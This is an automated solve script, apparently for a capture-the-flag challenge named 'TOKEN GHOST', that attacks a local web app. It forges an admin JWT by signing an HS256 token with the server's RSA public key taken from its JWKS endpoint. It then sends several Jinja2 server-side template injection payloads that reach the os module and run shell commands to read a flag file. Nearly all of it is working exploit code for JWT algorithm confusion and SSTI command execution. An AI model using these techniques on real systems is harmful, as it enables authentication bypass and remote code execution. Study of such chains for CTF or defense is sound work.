#!/usr/bin/env python3
"""
TOKEN GHOST — Automated Solve Script
Step-by-step: login → JWKS → JWT confusion → admin → SSTI → FLAG
"""

import base64
import hashlib
import hmac
import json
import sys

import requests
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend

BASE = "http://127.0.0.1:5555"


def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def step(n, title):
    print(f"\n{'='*60}")
    print(f"[STEP {n}] {title}")
    print("="*60)


# ─── Step 1: Recon ────────────────────────────────────────────
step(1, "Recon — robots.txt")
r = requests.get(f"{BASE}/robots.txt")
print(r.text)
# Spot /api/.well-known/

# ─── Step 2: Fetch JWKS and extract RSA public key PEM ────────
step(2, "Fetch JWKS → extract RSA public key PEM")
r = requests.get(f"{BASE}/api/.well-known/jwks.json")
jwks = r.json()
print(json.dumps(jwks, indent=2))

key = jwks["keys"][0]
n = int.from_bytes(b64url_decode(key["n"]), "big")
e = int.from_bytes(b64url_decode(key["e"]), "big")
pub_numbers = RSAPublicNumbers(e, n)
public_key = pub_numbers.public_key(default_backend())

from cryptography.hazmat.primitives import serialization
PUBLIC_PEM = public_key.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo,
)
print(f"\nRSA Public Key (PEM):\n{PUBLIC_PEM.decode()}")

def _b64url_enc(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_hs256(payload: dict, secret: bytes, extra_headers: dict = None) -> str:
    """Manually craft a JWT with HS256 signed by arbitrary bytes (bypasses PyJWT guards)."""
    header = {"alg": "HS256", "typ": "JWT", "kid": "key-001"}
    if extra_headers:
        header.update(extra_headers)
    h = _b64url_enc(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_enc(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{h}.{p}".encode()
    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_enc(sig)}"


# ─── Step 3: Login as normal user ─────────────────────────────
step(3, "Login as alice → get RS256 user token")
r = requests.post(f"{BASE}/api/auth/login", json={"username": "alice", "password": "test1234"})
print(r.json())
user_token = r.json()["token"]

# ─── Step 4: Try admin with user token → 403 ──────────────────
step(4, "Access /api/admin/dashboard with user token → expect 403")
r = requests.get(f"{BASE}/api/admin/dashboard", headers={"Authorization": f"Bearer {user_token}"})
print(f"Status: {r.status_code}")
print(r.json())

# ─── Step 5: Forge HS256 admin token ──────────────────────────
step(5, "Forge JWT: alg=HS256, role=admin, signed with RSA public key as HMAC secret")
admin_payload = {"sub": "1", "role": "admin", "username": "admin", "exp": 9999999999}
forged_token = forge_hs256(admin_payload, PUBLIC_PEM)
print(f"Forged token: {forged_token[:80]}...")

parts = forged_token.split(".")
header  = json.loads(b64url_decode(parts[0]))
payload = json.loads(b64url_decode(parts[1]))
print(f"\nHeader:  {json.dumps(header)}")
print(f"Payload: {json.dumps(payload)}")

# ─── Step 6: Access admin panel with forged token ─────────────
step(6, "Access /api/admin/dashboard with forged HS256 token → expect 200")
r = requests.get(f"{BASE}/api/admin/dashboard", headers={"Authorization": f"Bearer {forged_token}"})
print(f"Status: {r.status_code}")
print(r.json())

# ─── Step 7: SSTI probe ────────────────────────────────────────
step(7, "SSTI probe — {{7*7}} should return 49")
r = requests.get(
    f"{BASE}/api/admin/reports",
    params={"template": "{{7*7}}"},
    headers={"Authorization": f"Bearer {forged_token}"},
)
print(r.json())

# ─── Step 8: SSTI — read /flag.txt ────────────────────────────
step(8, "SSTI exploit — read /flag.txt via Jinja2 globals")

# Jinja2's built-in `lipsum` function leaks __globals__ without needing subclass index scan
payloads = [
    # Method 1: lipsum Jinja2 global leaks os module (most reliable, no index scan needed)
    "{{lipsum.__globals__['os'].popen('cat /tmp/flag.txt').read()}}",
    # Method 2: namespace built-in
    "{{namespace.__init__.__globals__['os'].popen('cat /tmp/flag.txt').read()}}",
    # Method 3: classic subclasses scan (index 396 is Popen but varies by Python version)
    "{{''.__class__.__mro__[1].__subclasses__()[396].__init__.__globals__['os'].popen('cat /tmp/flag.txt').read()}}",
]

flag = ""
for i, payload in enumerate(payloads, 1):
    r = requests.get(
        f"{BASE}/api/admin/reports",
        params={"template": payload},
        headers={"Authorization": f"Bearer {forged_token}"},
    )
    result = r.json()
    rendered = result.get("rendered", "")
    print(f"Payload {i}: {result}")
    if rendered.startswith("CTF4{"):
        flag = rendered
        break

if flag:
    print(f"\n{'*'*60}")
    print(f"  FLAG: {flag}")
    print(f"{'*'*60}\n")
else:
    print("\n[!] All SSTI payloads failed. Try manual scan:")
    scan = "{{''.__class__.__mro__[1].__subclasses__() | selectattr('__name__','equalto','Popen') | list}}"
    r = requests.get(f"{BASE}/api/admin/reports", params={"template": scan}, headers={"Authorization": f"Bearer {forged_token}"})
    print(r.json())
